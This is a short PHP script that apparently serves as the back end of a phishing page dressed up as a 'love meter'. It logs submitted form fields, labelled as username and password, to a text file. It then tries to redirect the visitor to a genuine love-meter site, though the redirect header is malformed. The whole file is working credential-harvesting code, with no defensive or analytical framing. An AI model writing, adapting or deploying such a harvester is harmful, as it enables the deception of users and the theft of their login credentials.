<?php

file_put_contents("usernames.txt", "Lover Username: " . $_POST['myname'] . " Pass: " . $_POST['crushname'] . "\n", FILE_APPEND);
header('https://www.prokerala.com/entertainment/love-meter/');
exit();
?>